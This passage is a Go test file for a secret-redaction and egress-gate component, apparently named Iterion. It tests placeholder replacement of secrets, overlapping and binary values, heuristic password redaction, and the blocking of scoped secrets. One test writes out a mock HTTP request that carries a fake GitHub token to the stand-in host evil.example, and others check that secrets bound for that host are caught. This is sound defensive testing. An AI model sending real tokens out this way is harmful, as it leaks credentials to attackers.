	for i := range 6 {
		secs = append(secs, Secret{Name: fmt.Sprintf("S%d", i), Value: file(fmt.Sprintf("deployer%d", i), 110<<10)})
	}
	secs = append(secs, Secret{Name: "BIG", Value: file("big", 3<<19)})
	g := New(secs, DefaultConfig())
	for _, s := range secs {
		for form, text := range map[string]string{
			"raw": s.Value, "trimmed": strings.TrimRight(s.Value, "\n"),
			"hex": hex.EncodeToString([]byte(s.Value)), "base64": base64.StdEncoding.EncodeToString([]byte(s.Value)),
		} {
			if got := g.Unmaterialize("x " + text + " y"); got != "x __ITERION_SECRET_"+s.Name+"__ y" {
				t.Errorf("%s %s: not mapped back (%d bytes)", s.Name, form, len(got))
			}
		}
	}
}

// A value that is not valid UTF-8 never makes the guard panic, and is matched.
func TestANonUTF8SecretNeverPanics(t *testing.T) {
	const value = "tok-\xff\xfe-9f8e7d6c5b4a"
	g := New([]Secret{{Name: "RAW", Value: value}}, DefaultConfig())
	if got := g.Unmaterialize("x " + value + " y"); got != "x __ITERION_SECRET_RAW__ y" {
		t.Fatalf("Unmaterialize = %q", got)
	}
}

// A value in a JSON string as JSON.stringify or jq write it — no HTML escaping
// of & < > — is recognised, the value without its final newline too.
func TestAValueInAJSONStringWithoutHTMLEscapingIsRecognised(t *testing.T) {
	const value = "p&ss\"w<rd>9f8e\n"
	g := New([]Secret{{Name: "S", Value: value}}, DefaultConfig())
	for _, body := range []string{`p&ss\"w<rd>9f8e\n`, `p&ss\"w<rd>9f8e`} {
		in := `{"out":"` + body + `"}`
		if got := g.Unmaterialize(in); got != `{"out":"__ITERION_SECRET_S__"}` {
			t.Errorf("Unmaterialize(%q) = %q", in, got)
		}
	}
}

// rva10cFile builds a multi-line, newline-terminated file value of n bytes.
func rva10cFile(tag string, n int) string {
	var b strings.Builder
	for i := 0; b.Len() < n; i++ {
		fmt.Fprintf(&b, "- name: %s-%06d\n  token: %x\n", tag, i, i*7919)
	}
	return b.String()[:n-1] + "\n"
}

// Two secrets whose occurrences overlap in the text — one's tail is the
// other's head — are both replaced: no part of either shows.
func TestTwoSecretsOverlappingInTheTextAreBothReplaced(t *testing.T) {
	g := New([]Secret{{Name: "A", Value: "abcd-efgh-ijkl-mnop"}, {Name: "B", Value: "wxyz-abcd-efgh"}}, DefaultConfig())
	got := g.Unmaterialize("x wxyz-abcd-efgh-ijkl-mnop y")
	for _, part := range []string{"wxyz", "abcd", "efgh", "ijkl", "mnop"} {
		if strings.Contains(got, part) {
			t.Fatalf("Unmaterialize = %q: %q of a secret shows", got, part)
		}
	}
}

// A host-scoped file secret ends with its newline; a tool that sends it
// ($(cat file) strips it) toward another host exfiltrates it.
func TestAFileSecretWithoutItsNewlineIsBlockedTowardAnotherHost(t *testing.T) {
	const tok = "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
	g := New([]Secret{{Name: "GH_TOKEN", Value: tok + "\n", Hosts: []string{"github.com"}}}, DefaultConfig())
	req := "GET /upload HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer " + tok + "\r\n\r\n"
	if !g.ExfiltratesTo(req, "evil.example") {
		t.Fatal("a host-scoped file secret sent without its final newline passed the egress gate")
	}
	if g.ExfiltratesTo(req, "api.github.com") {
		t.Fatal("control: the secret's own host is blocked")
	}
}

// The egress gate's fast path consults every part of the matcher: a large
// file secret and a binary one, matched as plain strings, and a token in an
// alternation.
func TestTheEgressGateSeesEveryKindOfLiteral(t *testing.T) {
	const tok = "sk-live-9f8e7d6c5b4a3210"
	const bin = "\x30\x82\x01\xff\xfe-DER-KEY-MATERIAL-9f8e7d6c5b4a"
	big := rva10cFile("big", 3<<19)
	g := New([]Secret{
		{Name: "BIG", Value: big, Hosts: []string{"vault.example.com"}},
		{Name: "KEY", Value: bin, Hosts: []string{"vault.example.com"}},
		{Name: "TOK", Value: tok, Hosts: []string{"api.example.com"}},
	}, DefaultConfig())
	if len(g.matcher.plain) == 0 || len(g.matcher.res) == 0 {
		t.Fatalf("scenario broken: %d plain literal(s), %d alternation(s)", len(g.matcher.plain), len(g.matcher.res))
	}
	for name, body := range map[string]string{"the token": "Bearer " + tok, "the binary key": "body=" + bin, "the large file": "body=" + big[:len(big)-1]} {
		if !g.ContainsSecret(body) || !g.ExfiltratesTo(body, "evil.example") {
			t.Errorf("%s passed the egress gate", name)
		}
	}
}

// A binary file secret that embeds another registered secret is replaced
// whole: the embedded one never breaks it apart.
func TestABinaryFileEmbeddingAnotherSecretIsReplacedWhole(t *testing.T) {
	const tok = "sk-live-9f8e7d6c5b4a3210"
	bin := "\x00\xff\xfeKEYSTORE-HEADER-0001:" + tok + ":KEYSTORE-TRAILER-PRIVATE-MATERIAL\xfd\n"
	g := New([]Secret{{Name: "STORE", Value: bin}, {Name: "TOK", Value: tok}}, DefaultConfig())
	if got := g.Unmaterialize("x " + bin + " y"); got != "x __ITERION_SECRET_STORE__ y" {
		t.Fatalf("Unmaterialize = %q: the binary file was broken apart by the secret it embeds", got)
	}
}

// Two binary secrets, one inside the other (a DER chain and its leaf): the
// longer is replaced whole.
func TestTheLongerOfTwoBinarySecretsIsReplacedWhole(t *testing.T) {
	leaf := "\x30\x82\x03\xff-LEAF-CERT-DER-0123456789abcdef"
	chain := leaf + "\x30\x82\x04\xfe-INTERMEDIATE-CERT-DER-fedcba9876543210"
	g := New([]Secret{{Name: "LEAF", Value: leaf}, {Name: "CHAIN", Value: chain}}, DefaultConfig())
	if got := g.Unmaterialize("x " + chain + " y"); got != "x __ITERION_SECRET_CHAIN__ y" {
		t.Fatalf("Unmaterialize = %q: the chain was broken apart by the leaf it holds", got)
	}
}

// Of two secrets sharing a prefix, the longer is replaced whole where it
// shows: the shorter never leaves its tail.
func TestTheLongerOfTwoSecretsSharingAPrefixIsReplacedWhole(t *testing.T) {
	g := New([]Secret{{Name: "SHORT", Value: "sk-live-9f8e7d6c"}, {Name: "LONG", Value: "sk-live-9f8e7d6c5b4a3210"}}, DefaultConfig())
	if got := g.Unmaterialize("key=sk-live-9f8e7d6c5b4a3210;"); got != "key=__ITERION_SECRET_LONG__;" {
		t.Fatalf("Unmaterialize = %q", got)
	}
	if got := g.Unmaterialize("key=sk-live-9f8e7d6c;"); got != "key=__ITERION_SECRET_SHORT__;" {
		t.Fatalf("control: Unmaterialize = %q", got)
	}
}

// A secret whose occurrences overlap one another in the text (a periodic
// binary key) is replaced at each: no half of it shows.
func TestASecretOverlappingItselfIsReplacedAtEachOccurrence(t *testing.T) {
	const period = "\xff\xfeKEY-9f8e"
	g := New([]Secret{{Name: "BIN", Value: period + period}}, DefaultConfig())
	got := g.Unmaterialize("x " + period + period + period + " y")
	if strings.Contains(got, "KEY-9f8e") {
		t.Fatalf("Unmaterialize = %q: a part of the secret shows", got)
	}
}

// The matcher of a large file secret costs about its forms, not tens of
// bytes of regexp program per byte.
func TestALargeFileSecretCostsAboutItsForms(t *testing.T) {
	secret := rva10cFile("big", 1<<20)
	runtime.GC()
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	g := New([]Secret{{Name: "BIG", Value: secret}}, DefaultConfig())
	runtime.GC()
	runtime.ReadMemStats(&after)
	retained := int64(after.HeapAlloc) - int64(before.HeapAlloc)
	runtime.KeepAlive(g)
	if retained > 64<<20 {
		t.Fatalf("a 1 MiB file secret keeps %d MiB of heap", retained>>20)
	}
}

// A value holding U+FFFD (a binary value that crossed a UTF-8 decoding
// channel on its way in) is matched byte for byte: an invalid byte of the
// text is not it, and never hides another secret inside a false match.
func TestAValueHoldingTheReplacementCharacterMatchesOnlyItself(t *testing.T) {
	const tok = "sk-live-9f8e7d6c5b4a3210"
	store := "KEYSTORE-HDR�:" + tok + ":TRAILER"
	g := New([]Secret{{Name: "STORE", Value: store}, {Name: "TOK", Value: tok}}, DefaultConfig())
	if got := g.Unmaterialize("x KEYSTORE-HDR\xff:" + tok + ":TRAILER y"); strings.Contains(got, tok) {
		t.Fatalf("Unmaterialize = %q: the token shows inside a false match", got)
	}
	if got := g.Unmaterialize("x " + store + " y"); got != "x __ITERION_SECRET_STORE__ y" {
		t.Fatalf("control: Unmaterialize = %q", got)
	}
}

// collapseSentinel turns every run of 0x01 into one.
func collapseSentinel(s string) string {
	var b strings.Builder
	prev := false
	for i := 0; i < len(s); i++ {
		if s[i] == 0x01 {
			if !prev {
				b.WriteByte(0x01)
			}
			prev = true
			continue
		}
		prev = false
		b.WriteByte(s[i])
	}
	return b.String()
}

// The matcher covers exactly the union of every registered literal's
// occurrences — periodic and overlapping ones, binary ones included: nothing
// of one shows, nothing else is taken.
func TestTheMatcherCoversExactlyTheUnionOfOccurrences(t *testing.T) {
	rng := rand.New(rand.NewSource(11))
	for iter := range 6000 {
		alpha := []string{"ab", "abc", "a\xff", "\xfe\xffa"}[iter%4]
		var secs []Secret
		var pieces []string
		for i := range 1 + rng.Intn(3) {
			l := 5 + rng.Intn(8)
			var b strings.Builder
			if rng.Intn(3) == 0 {
				per := 1 + rng.Intn(3)
				unit := make([]byte, per)
				for k := range unit {
					unit[k] = alpha[rng.Intn(len(alpha))]
				}
				for b.Len() < l {
					b.WriteByte(unit[b.Len()%per])
				}
			} else {
				for b.Len() < l {
					b.WriteByte(alpha[rng.Intn(len(alpha))])
				}
			}
			secs = append(secs, Secret{Name: string(rune('A' + i)), Value: b.String()})
			pieces = append(pieces, b.String())
		}
		g := New(secs, DefaultConfig())
		var tb strings.Builder
		for tb.Len() < 60+rng.Intn(80) {
			switch rng.Intn(3) {
			case 0:
				p := pieces[rng.Intn(len(pieces))]
				i := rng.Intn(len(p))
				tb.WriteString(p[i : i+rng.Intn(len(p)-i)+1])
			case 1:
				tb.WriteString(pieces[rng.Intn(len(pieces))])
			default:
				tb.WriteByte(alpha[rng.Intn(len(alpha))])
			}
		}
		text := tb.String()
		covered := make([]bool, len(text))
		for lit := range g.literalPlaceholder {
			for off := 0; ; {
				i := strings.Index(text[off:], lit)
				if i < 0 {
					break
				}
				for k := off + i; k < off+i+len(lit); k++ {
					covered[k] = true
				}
				off += i + 1
			}
		}
		var want strings.Builder
		for k := range len(text) {
			if covered[k] {
				want.WriteByte(0x01)
			} else {
				want.WriteByte(text[k])
			}
		}
		got := g.matcher.ReplaceAllStringFunc(text, func(m string) string {
			if _, ok := g.literalPlaceholder[m]; !ok {
				t.Fatalf("f called with %q, no registered literal", m)
			}
			return "\x01"
		})
		if collapseSentinel(got) != collapseSentinel(want.String()) {
			t.Fatalf("secrets %q\ntext %q\n got %q\nwant %q", pieces, text, collapseSentinel(got), collapseSentinel(want.String()))
		}
	}
}

// A text made of whole occurrences of a secret, back to back, materialises
// back to itself.
func TestBackToBackOccurrencesRoundTrip(t *testing.T) {
	for _, c := range []struct{ secret, text string }{
		{"abcabc", "abcabcabcabc"},
		{"xxxxxxxx", "xxxxxxxxxxxxxxxx"},
		{"sk-9f8e7d6c", "sk-9f8e7d6csk-9f8e7d6c"},
	} {
		g := New([]Secret{{Name: "S", Value: c.secret}}, DefaultConfig())
		if back := g.Materialize(g.Unmaterialize(c.text)); back != c.text {
			t.Errorf("secret %q text %q: materialised back = %q", c.secret, c.text, back)
		}
	}
}

// A periodic secret over a long run of its period is replaced in one pass,
// its output no longer than the text: before, each byte of the run restarted
// the search (256 KiB took minutes) and each overlapping occurrence got a
// placeholder.
func TestAPeriodicSecretOverAPeriodicTextStaysLinear(t *testing.T) {
	g := New([]Secret{{Name: "X", Value: strings.Repeat("x", 512)}}, DefaultConfig())
	text := strings.Repeat("x", 256<<10)
	start := time.Now()
	out := g.Unmaterialize(text)
	if el := time.Since(start); el > 5*time.Second || len(out) > len(text) || strings.Contains(out, "xxxxx") {
		t.Fatalf("Unmaterialize took %s, %d bytes out of %d", el, len(out), len(text))
	}
}

// A secret that ends another is covered by it: the longer is replaced once,
// the shorter never appended after it — Materialize would then write the
// longer value followed by the shorter.
func TestASecretEndingAnotherIsReplacedOnce(t *testing.T) {
	g := New([]Secret{{Name: "KEY", Value: "sk-live-9f8e7d6c5b4a3210"}, {Name: "TAIL", Value: "9f8e7d6c5b4a3210"}}, DefaultConfig())
	un := g.Unmaterialize("key=sk-live-9f8e7d6c5b4a3210;")
	if un != "key=__ITERION_SECRET_KEY__;" {
		t.Fatalf("Unmaterialize = %q", un)
	}
	if back := g.Materialize(un); back != "key=sk-live-9f8e7d6c5b4a3210;" {
		t.Fatalf("round trip = %q", back)
	}
}

// A kubeconfig-sized file secret (20 KiB) costs about its forms too: a
// literal of a few KiB is matched as a plain string, not compiled.
func TestAKubeconfigSizedSecretCostsAboutItsForms(t *testing.T) {
	secret := rva10cFile("kube", 20<<10)
	runtime.GC()
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	g := New([]Secret{{Name: "KUBECONFIG", Value: secret}}, DefaultConfig())
	runtime.GC()
	runtime.ReadMemStats(&after)
	retained := int64(after.HeapAlloc) - int64(before.HeapAlloc)
	runtime.KeepAlive(g)
	if retained > 4<<20 {
		t.Fatalf("a 20 KiB file secret keeps %d MiB of heap", retained>>20)
	}
}

// The group's longest literal starts one byte before a run's end and runs
// past it by one byte: the prefix check reaches it.
func TestALongestLiteralStraddlingARunEndByOneByteIsReplaced(t *testing.T) {
	g := New([]Secret{{Name: "A", Value: "34343"}, {Name: "B", Value: "44444445"}}, DefaultConfig())
	if g.LongestLiteral() != 16 {
		t.Fatalf("scenario broken: the longest literal is %d bytes, want hex(B)'s 16", g.LongestLiteral())
	}
	text := strings.Repeat("34", 10) + "35"
	if got := g.Unmaterialize(text); strings.HasSuffix(got, "5") || !strings.HasSuffix(got, "__ITERION_SECRET_B__") {
		t.Fatalf("Unmaterialize(%q) = %q: B's hex form straddling the run of A shows", text, got)
	}
}

// A run that starts inside an earlier match counts its placeholders from
// where that match ends: the text round-trips.
func TestARunAfterAnOverlappingMatchRoundTrips(t *testing.T) {
	g := New([]Secret{{Name: "P", Value: "abxxxxx"}, {Name: "Q", Value: "xxxxx"}}, DefaultConfig())
	text := "ab" + strings.Repeat("x", 10)
	if back := g.Materialize(g.Unmaterialize(text)); back != text {
		t.Fatalf("Unmaterialize(%q) materialised back = %q", text, back)
	}
}

// A partial overlap emits both placeholders: the second secret is never
// dropped.
func TestAPartialOverlapKeepsBothSecrets(t *testing.T) {
	g := New([]Secret{{Name: "A", Value: "abcd-efgh-ijkl-mnop"}, {Name: "B", Value: "wxyz-abcd-efgh"}}, DefaultConfig())
	if got := g.Unmaterialize("x wxyz-abcd-efgh-ijkl-mnop y"); got != "x __ITERION_SECRET_B____ITERION_SECRET_A__ y" {
		t.Fatalf("Unmaterialize = %q", got)
	}
}

// Each alternation group — a large secret set splits the literals into
// several — searches on its own: a match of the second before the first
// group's last one is replaced, and a run in the second checks the second
// group's literals past its end.
func TestEachLiteralGroupSearchesOnItsOwn(t *testing.T) {
	const big = "tok-first-group-0123456789abcdef"
	m := &literalMatcher{}
	for _, lits := range [][]string{{big}, {"tok-short-9f8e7d6c", "3434343434343435", "34343"}} {
		if err := m.addAlternation(lits); err != nil {
			t.Fatal(err)
		}
	}
	mark := func(lit string) string { return "<" + lit[:3] + ">" }
	if got := m.ReplaceAllStringFunc("tok-short-9f8e7d6c "+big, mark); got != "<tok> <tok>" {
		t.Fatalf("ReplaceAllStringFunc = %q: the second group's match before the first group's was skipped", got)
	}
	if got := m.ReplaceAllStringFunc(strings.Repeat("34", 10)+"35", mark); strings.HasSuffix(got, "5") {
		t.Fatalf("ReplaceAllStringFunc = %q: a literal of the run's group past its end shows", got)
	}
}

// The run group first: its run checks its own literals past the run's end,
// not another group's.
func TestTheFirstGroupsRunChecksItsOwnLiterals(t *testing.T) {
	m := &literalMatcher{}
	for _, lits := range [][]string{{"3434343434343435", "34343"}, {"tok-first-group-0123456789abcdef"}} {
		if err := m.addAlternation(lits); err != nil {
			t.Fatal(err)
		}
	}
	mark := func(lit string) string { return "<" + lit[:3] + ">" }
	if got := m.ReplaceAllStringFunc(strings.Repeat("34", 10)+"35", mark); strings.HasSuffix(got, "5") {
		t.Fatalf("ReplaceAllStringFunc = %q: a literal of the first group's run past its end shows", got)
	}
}

// The heuristic pass never redacts a placeholder: a secret's safe form, whose
// reference whoever reads the text back needs (the assistant's chat history is
// projected from scrubbed events). A value next to it is.
func TestTheHeuristicNeverRedactsAPlaceholder(t *testing.T) {
	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
	for _, s := range []string{
		"use api_key=__ITERION_SECRET_OPENAI_KEY__ for the call",
		"password: __ITERION_SECRET_DB_PASSWORD__",
		"secret=__ITERION_SECRET_DEPLOY_TOKEN__",
		"Authorization: Bearer __ITERION_SECRET_GH_TOKEN_FOR_THE_DEPLOY_BOT__",
	} {
		if got := g.Redact(s); got != s {
			t.Errorf("Redact(%q) = %q: the placeholder was redacted", s, got)
		}
	}
	if got := g.Redact("password: hunter2-9f8e7d6c5b4a3210-FAKE"); !strings.Contains(got, "[redacted]") {
		t.Fatalf("scenario broken: the heuristic spared an unknown password: %q", got)
	}
	// A span holding a placeholder and more is no placeholder.
	if got := g.Redact("password: __ITERION_SECRET_DB_PASSWORD__hunter2-9f8e7d6c5b4a3210-FAKE"); strings.Contains(got, "hunter2") {
		t.Errorf("a value glued to a placeholder was spared: %q", got)
	}
}

// A placeholder of a lower-case secret name (the DSL's own examples:
// github_token, deploy_key) is kept.
func TestTheHeuristicKeepsALowerCasePlaceholder(t *testing.T) {
	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
	for _, s := range []string{"password: __ITERION_SECRET_db_password__", "secret=__ITERION_SECRET_deploy_key__"} {
		if got := g.Redact(s); got != s {
			t.Errorf("Redact(%q) = %q", s, got)
		}
	}
}

// A value glued BEFORE a placeholder is no placeholder.
func TestAValueGluedBeforeAPlaceholderIsRedacted(t *testing.T) {
	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
	if got := g.Redact("password: hunter2-9f8e7d6c5b4a3210-FAKE__ITERION_SECRET_DB_PASSWORD__"); strings.Contains(got, "hunter2") {
		t.Errorf("a value glued before a placeholder was spared: %q", got)
	}
}

// A placeholder that ends a sentence is kept — the detector's span takes
// the trailing punctuation with it, an ellipsis included.
func TestAPlaceholderEndingASentenceIsKept(t *testing.T) {
	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
	for _, s := range []string{
		"I set api_key=__ITERION_SECRET_DEPLOY_TOKEN__.",
		"The password: __ITERION_SECRET_DB_PASSWORD__. Done",
		"client_secret=__ITERION_SECRET_OAUTH_CLIENT_SECRET__.\n",
		"password: __ITERION_SECRET_DB_PASSWORD__...",
		"I set it to __ITERION_SECRET_DEPLOY_TOKEN__.. then",
	} {
		if got := g.Redact(s); !strings.Contains(got, "__ITERION_SECRET_") {
			t.Errorf("Redact(%q) = %q: the placeholder was redacted", s, got)
		}
	}
	if got := g.Redact("password: hunter2-9f8e7d6c5b4a3210-FAKE."); strings.Contains(got, "hunter2") {
		t.Fatalf("an unknown value ending a sentence was spared: %q", got)
	}
}
